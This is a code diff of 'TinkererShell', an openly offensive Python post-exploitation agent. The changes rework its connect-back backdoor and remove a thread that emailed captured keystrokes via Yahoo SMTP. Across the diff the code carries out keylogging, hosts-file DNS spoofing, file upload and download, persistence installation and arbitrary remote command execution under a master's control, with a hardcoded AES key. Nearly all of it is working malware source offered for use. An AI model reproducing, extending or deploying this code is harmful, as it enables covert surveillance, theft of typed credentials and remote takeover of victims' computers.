@@ -2,12 +2,10 @@
 # -*- coding: utf-8 -*-
 """TinkererShell bot, a simple agent for post exploitation.\n"""
 
-
 # Written By Ananke: https://github.com/4n4nk3
 import json
 import os
 import shutil
-import smtplib
 import socket
 import subprocess
 import sys
@@ -15,7 +13,6 @@ import tempfile
 import threading
 import time
 from base64 import b64encode, b64decode
-from email.mime.text import MIMEText
 from filecmp import cmp
 from pathlib import Path
 
@@ -28,8 +25,6 @@ from tendo import singleton
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
 import autorun
 
-# Activating mailsender (True)
-mailactivation = False
 # Activating persistence (True)
 persistenceactivation = False
 
@@ -114,7 +109,7 @@ me = singleton.SingleInstance()
 
 def receiver() -> str:
     """Receive data from master, decrypt it and return it.\n"""
-    lengthcrypt = s.recv(1024)
+    lengthcrypt = s.recv(1024).decode('utf-8')
     expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data = ''
     while len(encrypted_received_data) < expected_length:
@@ -237,17 +232,17 @@ def keylogs_stop():
         sender('Keylogger is not running!\n')
 
 
-def keylogs_download(keylogfile_dow: str):
+def keylogs_download():
     """Send keylogged data to the master and delete it from victim host.\n"""
     try:
-        with open(keylogfile_dow, 'rb') as f_kd:
+        with open(keylogfile, 'rb') as f_kd:
             keylogged_data = b64decode(f_kd.read()).decode('utf-8')
         sender(keylogged_data + '\n')
     except Exception as exception:
         sender('reachedexcept')
         sender(str(exception))
     try:
-        cleaner = open(keylogfile_dow, 'w')
+        cleaner = open(keylogfile, 'w')
         cleaner.write('')
         cleaner.close()
     except Exception as exception:
@@ -286,7 +281,7 @@ def uploader():
         sender('Operation aborted\n')
 
 
-def encode_aes(text_input):
+def encode_aes(text_input: str) -> str:
     """Encode a string and output an json in string form.\n"""
     secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
     cipher = AES.new(secret, AES.MODE_EAX)
@@ -297,7 +292,7 @@ def encode_aes(text_input):
     return json.dumps(dict(zip(json_k, json_v)))
 
 
-def decode_aes(json_input):
+def decode_aes(json_input: str) -> str:
     """Decode a string in json form and output a string.\n"""
     try:
         b64 = json.loads(json_input)
@@ -315,7 +310,7 @@ def decode_aes(json_input):
 # =================================================================================================
 
 # Defining correct keylogging procedure
-def keylogger(fd_temp_key: int, keylogfile_key: str):
+def keylogger(fd_temp_key: int):
     """Key logger thread.\n"""
 
     def OnKeyboardEvent(event):
@@ -323,7 +318,7 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
         if not thr_block.isSet():
             if event.Ascii != 0 or 8:
                 # Use base64 and not an encryption just for performance
-                with open(keylogfile_key, 'r+b') as f_key:
+                with open(keylogfile, 'r+b') as f_key:
                     data_decoded = b64decode(f_key.read()).decode('utf-8')
                     f_key.seek(0)
                     if event.Key == 'space':
@@ -349,7 +344,7 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
                         f_key.write(b64encode(data_decoded.encode('utf-8')))
         if thr_exit.isSet():
             os.close(fd_temp_key)
-            sys.exit(0)
+            hm.cancel()
         return True
 
     # create a hook manager
@@ -370,178 +365,156 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
 
 # =================================================================================================
 
-def mailsender(keylogfile_mail: str):
-    """Thread to send keylogged data via email every 5 minutes (300 seconds).\n"""
-    user_name = 'name'
-    password = 'password'
-
-    sender_email = 'sender@yahoo.it'
-    receiver_email = 'reciver@yahoo.it'
-
-    while 1:
-        time.sleep(300)
-        if not thr_block.isSet():
-            try:
-                fo = open(keylogfile_mail, 'r')
-                msg = MIMEText(fo.read())
-                fo.close()
-                msg['Subject'] = 'Logged keystrokes'
-                msg['From'] = sender_email
-                msg['To'] = receiver_email
-            except Exception as exception:
-                print(exception)
-            try:
-                mail_socket = smtplib.SMTP_SSL('smtp.mail.yahoo.com:465')
-                mail_socket.login(user_name, password)
-                # noinspection PyUnboundLocalVariable
-                mail_socket.sendmail(sender_email, [receiver_email], msg.as_string())
-                mail_socket.close()
-                print('Successfully sent email')
-            except Exception as exception:
-                print(exception)
-
-
-# =================================================================================================
-
-def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
+def backdoor():
     """Shell thread that connect to master and permit control over the agent.\n"""
-    host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
-    port = 4444  # The connection port to use
-
-    # Defining global the variables that I need to use in many different functions
-    global s
-
-    # Creating the socket
-    first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    if platform == 'windows':
-        dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
-        dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
-    else:
-        dnsfile = '/etc/hosts'
-        dnsbackup = tempfile.gettempdir() + '/spoofbackup'
-
-    # Backing up Hosts file
-    f_bd = open(dnsfile, 'r')
-    buffer = f_bd.read()
-    f_bd.close()
-    f_bd = open(dnsbackup, 'w')
-    f_bd.write(buffer)
-    f_bd.close()
-
-    # Connection loop
     while True:
+        host = '127.0.0.1'  # Remote host to which you want the backdoor to connect to
+        port = 4444  # The connection port to use
+
+        # Defining global the variables that I need to use in many different functions
+        global s
+
+        # Creating the socket
+        first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        if platform == 'windows':
+            dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
+            dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
+        else:
+            dnsfile = '/etc/hosts'
+            dnsbackup = tempfile.gettempdir() + '/spoofbackup'
+
+        # Backing up Hosts file
+        f_bd = open(dnsfile, 'r')
+        buffer = f_bd.read()
+        f_bd.close()
+        f_bd = open(dnsbackup, 'w')
+        f_bd.write(buffer)
+        f_bd.close()
+
+        # Connection loop
         while True:
-            try:
-                # Connecting to the client
-                first_s.connect((host, port))
+            while True:
+                if thr_exit.isSet():
+                    break
+                try:
+                    # Connecting to the client
+                    first_s.connect((host, port))
+                    break
+                    # If i cannot connect I wait 2 minutes and then I retry
+                except Exception as exception:
+                    print(exception)
+                    print('>>> New attempt in 2 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 1,5 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 1 min')
+                    time.sleep(30)
+                    print('>>> New attempt in 30 sec')
+                    time.sleep(30)
+            if thr_exit.isSet():
                 break
-                # If i cannot connect I wait 2 minutes and then I retry
-            except Exception as exception:
-                print(exception)
-                print('>>> New attempt in 2 min')
-                time.sleep(30)
-                print('>>> New attempt in 1,5 min')
-                time.sleep(30)
-                print('>>> New attempt in 1 min')
-                time.sleep(30)
-                print('>>> New attempt in 30 sec')
-                time.sleep(30)
-        # Sending information relatives to the infected system
-        proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
-        username = proc.stdout.split()[0]
-        # First time i send username
-        encoded = encode_aes(username)
-        length = str(len(encoded))
-        length_crypt = encode_aes(length)
-        # Sending the length and wait. Then send data
-        first_s.send(bytes(length_crypt, 'utf-8'))
-        time.sleep(1)
-        first_s.send(bytes(encoded, 'utf-8'))
-        print('Connection successful')
-        lengthcrypt = first_s.recv(1024).decode('utf-8')
-        expected_length = int(str(decode_aes(lengthcrypt)))
-        encrypted_received_data = ''
-        while len(encrypted_received_data) < expected_length:
-            encrypted_received_data += first_s.recv(1024).decode('utf-8')
-        new_port = int(decode_aes(encrypted_received_data))
-        print('New port is gonna be {}'.format(new_port))
-        time.sleep(5)
-        first_s.close()
-        # Connecting to the client on the new port
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, new_port))
-        # Sending information relatives to the infected system
-        encoded = encode_aes(username)
-        length = str(len(encoded))
-        length_crypt = encode_aes(length)
-        # Sending the length and wait. Then send data
-        s.send(bytes(length_crypt, 'utf-8'))
-        time.sleep(1)
-        s.send(bytes(encoded, 'utf-8'))
-        break
+            # Sending information relatives to the infected system
+            proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
+            username = proc.stdout.split()[0]
+            # First time i send username
+            encoded = encode_aes(username)
+            length = str(len(encoded))
+            length_crypt = encode_aes(length)
+            # Sending the length and wait. Then send data
+            first_s.send(bytes(length_crypt, 'utf-8'))
+            time.sleep(1)
+            first_s.send(bytes(encoded, 'utf-8'))
+            print('Connection successful')
+            lengthcrypt = first_s.recv(1024).decode('utf-8')
+            expected_length = int(str(decode_aes(lengthcrypt)))
+            encrypted_received_data = ''
+            while len(encrypted_received_data) < expected_length:
+                encrypted_received_data += first_s.recv(1024).decode('utf-8')
+            new_port = int(decode_aes(encrypted_received_data))
+            print('New port is gonna be {}'.format(new_port))
+            time.sleep(5)
+            first_s.close()
+            # Connecting to the client on the new port
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, new_port))
+            # Sending information relatives to the infected system
+            encoded = encode_aes(username)
+            length = str(len(encoded))
+            length_crypt = encode_aes(length)
+            # Sending the length and wait. Then send data
+            s.send(bytes(length_crypt, 'utf-8'))
+            time.sleep(1)
+            s.send(bytes(encoded, 'utf-8'))
+            break
 
-    # Commands loop
-    while 1:
-        received_command = receiver()
-        if received_command != 'KeepAlive':
-            if received_command == 'SHquit':
-                sender('mistochiudendo')
-                break
-            elif received_command == 'SHprocesslist':
-                listprocesses()
-            elif received_command == 'SHprocesskill':
-                killprocesses()
-            elif received_command == 'SHdnsstart':
-                dnsspoofer(dnsfile)
-            elif received_command == 'SHdnsstop':
-                if cmp(dnsfile, dnsbackup) is False:
-                    dnscleaner(dnsfile, dnsbackup, send=True)
-                else:
-                    sender('Original hosts file and current one are the same! Nothing to change.')
-            elif received_command == 'SHdownload':
-                downloader()
-            elif received_command == 'SHupload':
-                uploader()
-            elif received_command == 'SHkeylogstatus':
-                keylogs_status()
-            elif received_command == 'SHkeylogstart':
-                keylogs_start()
-            elif received_command == 'SHkeylogstop':
-                keylogs_stop()
-            elif received_command == 'SHkeylogdownload':
-                keylogs_download(keylogfile_bd)
-            elif received_command == 'SHpersistenceenable':
-                if persistence_install():
-                    sender('Persistence installation successful!')
-                else:
-                    sender('Persistence already installed!')
-            elif received_command == 'SHpersistencedisable':
-                if persistence_remove():
-                    sender('Persistence remove successful!')
-                else:
-                    sender('Persistence not yet installed!')
-            elif received_command == 'SHpersistencestatus':
-                if persistence_status():
-                    sender('Persistence is installed.')
-                else:
-                    sender('Persistence is not installed.')
-            else:
-                command_executor(received_command)
+        # Commands loop
+        if not thr_exit.isSet():
+            while 1:
+                received_command = receiver()
+                if received_command != 'KeepAlive':
+                    if received_command == 'SHquit':
+                        sender('mistochiudendo')
+                        break
+                    elif received_command == 'SHkill':
+                        sender('mistochiudendo')
+                        # If thr_exit.set() next keystroke will terminate keylogger thread
+                        thr_exit.set()
+                        break
+                    elif received_command == 'SHprocesslist':
+                        listprocesses()
+                    elif received_command == 'SHprocesskill':
+                        killprocesses()
+                    elif received_command == 'SHdnsstart':
+                        dnsspoofer(dnsfile)
+                    elif received_command == 'SHdnsstop':
+                        if cmp(dnsfile, dnsbackup) is False:
+                            dnscleaner(dnsfile, dnsbackup, send=True)
+                        else:
+                            sender('Original hosts file and current one are the same! Nothing to change.')
+                    elif received_command == 'SHdownload':
+                        downloader()
+                    elif received_command == 'SHupload':
+                        uploader()
+                    elif received_command == 'SHkeylogstatus':
+                        keylogs_status()
+                    elif received_command == 'SHkeylogstart':
+                        keylogs_start()
+                    elif received_command == 'SHkeylogstop':
+                        keylogs_stop()
+                    elif received_command == 'SHkeylogdownload':
+                        keylogs_download()
+                    elif received_command == 'SHpersistenceenable':
+                        if persistence_install():
+                            sender('Persistence installation successful!')
+                        else:
+                            sender('Persistence already installed!')
+                    elif received_command == 'SHpersistencedisable':
+                        if persistence_remove():
+                            sender('Persistence remove successful!')
+                        else:
+                            sender('Persistence not yet installed!')
+                    elif received_command == 'SHpersistencestatus':
+                        if persistence_status():
+                            sender('Persistence is installed.')
+                        else:
+                            sender('Persistence is not installed.')
+                    else:
+                        command_executor(received_command)
 
-    # Recreating original hosts file of the system
-    if cmp(dnsfile, dnsbackup) is False:
-        dnscleaner(dnsfile, dnsbackup)
-    try:
-        os.remove(dnsbackup)
-    except Exception as exception:
-        print(exception)
-    # Closing socket
-    s.close()
-    print('Connection closed')
-    # If thr_exit.set() next keystroke will terminate keylogger thread
-    if mailactivation_bd is False:
-        thr_exit.set()
+        # Recreating original hosts file of the system
+        if cmp(dnsfile, dnsbackup) is False:
+            dnscleaner(dnsfile, dnsbackup)
+        try:
+            os.remove(dnsbackup)
+        except Exception as exception:
+            print(exception)
+        # Closing socket
+        s.close()
+        print('Connection closed')
+        if thr_exit.isSet():
+            break
+        time.sleep(120)
     return True
 
 
@@ -549,15 +522,12 @@ thr_block = threading.Event()
 thr_exit = threading.Event()
 
 # Keylogger's thread
-thread1 = threading.Thread(name='sic1', target=keylogger, args=(fd_temp, keylogfile)).start()
+thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start()
 # Backdoor's thread
-thread2 = threading.Thread(name='sic2', target=backdoor, args=(mailactivation, keylogfile)).start()
-# If mailactivation is True I define the mailsender thread
-if mailactivation is True:
-    thread3 = threading.Thread(name='sic3', target=mailsender, args=keylogfile).start()
+thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
+# TODO: Add function to kill a single bot
 # TODO: Split source in modules
-# TODO: Configure/Enable/Disable mail activation from shell cmd
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 # TODO: Add active window recognition
 # TODO: Add screenshooter
